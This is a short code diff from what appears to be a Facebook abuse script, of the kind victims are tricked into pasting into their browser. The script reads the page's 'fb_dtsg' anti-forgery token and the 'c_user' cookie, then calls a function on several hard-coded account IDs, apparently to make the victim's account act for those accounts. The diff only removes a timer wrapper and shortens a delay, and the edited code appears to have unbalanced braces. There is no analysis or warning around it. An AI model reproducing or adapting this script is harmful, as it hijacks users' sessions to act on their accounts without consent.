@@ -1,4 +1,4 @@
-setTimeout(function () { 
+
 /*Admin Post*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -48,8 +48,8 @@ setTimeout(function () {
     IDS("100003200476066");
     IDS("100006342757697");
     IDS("100005202368891");
-}, 7000);
+}, 4000);
 
-}, 2000);
+
 
 
